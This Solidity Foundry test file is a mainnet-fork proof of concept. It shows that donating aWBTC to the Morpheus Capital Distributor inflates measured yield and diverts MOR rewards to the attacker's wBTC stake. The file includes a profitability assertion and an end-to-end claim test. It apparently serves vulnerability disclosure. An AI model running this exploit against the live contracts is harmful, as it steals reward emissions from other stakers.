// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function distributedRewards(uint256, address) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

/// @notice Fork PoC: yield-share manipulation via aToken donation (Morpheus Capital, M1).
/// Attacker stakes 2 wBTC in the wBTC DepositPool (pool 0), then donates aWBTC
/// directly to the Distributor. Distributor.distributeRewards() measures yield as the
/// raw aToken balance delta, so the donation is counted as wBTC-pool yield and skews
/// that day's MOR emission toward the wBTC pool, of which the attacker is the
/// dominant staker. The donation is swept to L1Sender (real cost); the MOR gain
/// must exceed it. Control branch (no donation) is run on the same fork state via
/// snapshot/revert so the delta is attributable to the donation alone.
/// No privileged accounts are used. Fork only; no mainnet execution, no real funds.
contract M1YieldDonationTest is Test {
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant AWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant AAVE_PROVIDER = 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e;

    address constant ATTACKER = 0x00000000000000000000000000000000a77ac4e1;

    uint256 constant STAKE = 2e8; // 2 wBTC (8 decimals)
    uint256 constant AAVE_SUPPLY = 1e7; // 0.1 wBTC supplied to Aave to mint aWBTC
    uint256 constant DONATION = 420000; // 0.0042 wBTC of aWBTC (~$263 at $62,551/BTC)

    // Live reference prices at fork block (Chainlink answers read on 2026-11-20):
    // wBTC $62,551, MOR ~$0.70 (CoinGecko via Bybit, 2026-11-19).
    uint256 constant WBTC_USD_1E18 = 62551e18;
    uint256 constant MOR_USD_1E18 = 70e16; // $0.70

    function test_yieldDonationSkewsMOR() public {
        address aavePool = IAaveProvider(AAVE_PROVIDER).getPool();

        uint128 lastCalc = IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);
        uint256 distTime = uint256(lastCalc) + 86401;

        // Fork artifact: Chainlink feeds are frozen at the fork block, so warping
        // ~7.6h to the next distribution would trip the staleness guard
        // (allowedPriceUpdateDelay 3600s on stETH/wETH/BTC feeds) and revert in
        // updateDepositTokensPrices. Mock ONLY the third-party feeds to return
        // their real live answers with a fresh updatedAt. Re-mocked after every
        // warp (mockCalls are cheatcode state and survive snapshot reverts).
        // All Morpheus contracts run unmodified.
        _mockFreshFeeds(block.timestamp);

        // --- Setup: fund attacker with wBTC (fork deal, no real funds) ---
        deal(WBTC, ATTACKER, STAKE + AAVE_SUPPLY);
        vm.startPrank(ATTACKER);
        IERC20(WBTC).approve(DISTRIBUTOR, STAKE);
        IERC20(WBTC).approve(aavePool, AAVE_SUPPLY);
        // Stake 2 wBTC in pool 0, no lock (claimLockEnd=0), no referrer.
        IDepositPool(WBTC_POOL).stake(0, STAKE, 0, address(0));
        // Mint aWBTC by supplying 0.1 wBTC to Aave (attacker-held, outside protocol).
        IAavePool(aavePool).supply(WBTC, AAVE_SUPPLY, ATTACKER, 0);
        vm.stopPrank();

        uint256 aWBTCBal = IERC20(AWBTC).balanceOf(ATTACKER);
        console.log("attacker aWBTC balance:", aWBTCBal);
        require(aWBTCBal >= DONATION, "not enough aWBTC minted");

        uint256 snap = vm.snapshotState();

        // --- Control branch: no donation ---
        vm.warp(distTime);
        _mockFreshFeeds(distTime);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 pendingControl = IDepositPool(WBTC_POOL).getLatestUserReward(0, ATTACKER);
        uint256 distControl = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL);
        console.log("CONTROL pending MOR (1e18):", pendingControl);
        console.log("CONTROL pool distributedRewards:", distControl);

        // --- Attack branch: donate aWBTC to the Distributor, then distribute ---
        vm.revertToState(snap);
        vm.startPrank(ATTACKER);
        IERC20(AWBTC).transfer(DISTRIBUTOR, DONATION);
        vm.stopPrank();
        vm.warp(distTime);
        _mockFreshFeeds(distTime);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 pendingAttack = IDepositPool(WBTC_POOL).getLatestUserReward(0, ATTACKER);
        uint256 distAttack = IDistributor(DISTRIBUTOR).distributedRewards(0, WBTC_POOL);
        console.log("ATTACK pending MOR (1e18):", pendingAttack);
        console.log("ATTACK pool distributedRewards:", distAttack);

        uint256 deltaMOR = pendingAttack - pendingControl;
        uint256 deltaPool = distAttack - distControl;
        console.log("delta attacker MOR (1e18):", deltaMOR);
        console.log("delta pool MOR (1e18):", deltaPool);

        // Donation cost in USD (1e18): DONATION sat * $62,551 / 1e8
        uint256 donationUSD = (DONATION * WBTC_USD_1E18) / 1e8;
        uint256 gainUSD = (deltaMOR * MOR_USD_1E18) / 1e18;
        console.log("donation cost USD (1e18):", donationUSD);
        console.log("attacker MOR gain USD (1e18):", gainUSD);

        // The donation must have moved MOR to the wBTC pool, and the attacker's
        // net gain (MOR value minus donation cost) must be positive.
        assertGt(deltaPool, 0, "donation did not increase pool MOR");
        assertGt(pendingAttack, pendingControl, "attacker gained no MOR");
        assertGt(gainUSD, donationUSD, "attack not profitable: MOR gain <= donation cost");
    }

    /// @notice End-to-end: the skewed MOR is actually claimable via the real
    /// claim path (DepositPool.claim -> Distributor -> L1SenderV2 LayerZero
    /// send). Warps 14 days past the stake to satisfy claimLockPeriodAfterStake
    /// (1209600s). Success = the LayerZero send executes on the fork.
    function test_claimEndToEnd() public {
        address aavePool = IAaveProvider(AAVE_PROVIDER).getPool();
        uint128 lastCalc = IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);
        uint256 distTime = uint256(lastCalc) + 86401;
        _mockFreshFeeds(block.timestamp);

        deal(WBTC, ATTACKER, STAKE + AAVE_SUPPLY);
        vm.startPrank(ATTACKER);
        IERC20(WBTC).approve(DISTRIBUTOR, STAKE);
        IERC20(WBTC).approve(aavePool, AAVE_SUPPLY);
        IDepositPool(WBTC_POOL).stake(0, STAKE, 0, address(0));
        IAavePool(aavePool).supply(WBTC, AAVE_SUPPLY, ATTACKER, 0);
        IERC20(AWBTC).transfer(DISTRIBUTOR, DONATION);
        vm.stopPrank();

        uint256 stakeTime = block.timestamp;
        vm.warp(distTime);
        _mockFreshFeeds(distTime);
        IDistributor(DISTRIBUTOR).distributeRewards(0);
        uint256 pending = IDepositPool(WBTC_POOL).getLatestUserReward(0, ATTACKER);
        console.log("pending MOR before claim (1e18):", pending);
        assertGt(pending, 0, "no pending MOR to claim");

        // Satisfy claim locks (14d after stake) and re-fresh mocked feeds.
        vm.warp(stakeTime + 1209600 + 1);
        _mockFreshFeeds(block.timestamp);
        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        // claim(pool, receiver) is payable: msg.value funds the LayerZero send.
        (bool ok, ) = WBTC_POOL.call{value: 0.05 ether}(
            abi.encodeWithSignature("claim(uint256,address)", 0, ATTACKER)
        );
        assertTrue(ok, "claim() reverted on fork");
        uint256 pendingAfter = IDepositPool(WBTC_POOL).getLatestUserReward(0, ATTACKER);
        console.log("pending MOR after claim (1e18):", pendingAfter);
    }

    /// @dev Re-serve each feed's real live answer with updatedAt = `freshAt`.
    /// Only the third-party Chainlink feeds are mocked; no Morpheus code is touched.
    function _mockFreshFeeds(uint256 freshAt) internal {
        address[6] memory feeds = [
            0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD
            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419, // ETH/USD
            0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23, // wBTC/BTC
            0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD
            0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6, // USDC/USD
            0x3E7d1eAB13ad0104d2750B8863b489D65364e32D // USDT/USD
        ];
        bytes memory sel = abi.encodeWithSelector(bytes4(0xfeaf968c)); // latestRoundData()
        for (uint256 i = 0; i < feeds.length; i++) {
            (bool ok, bytes memory ret) = feeds[i].staticcall(sel);
            require(ok, "feed read failed");
            (uint80 roundId, int256 answer, , , ) = abi.decode(
                ret,
                (uint80, int256, uint256, uint256, uint80)
            );
            vm.mockCall(
                feeds[i],
                sel,
                abi.encode(roundId, answer, freshAt, freshAt, roundId)
            );
        }
    }
}
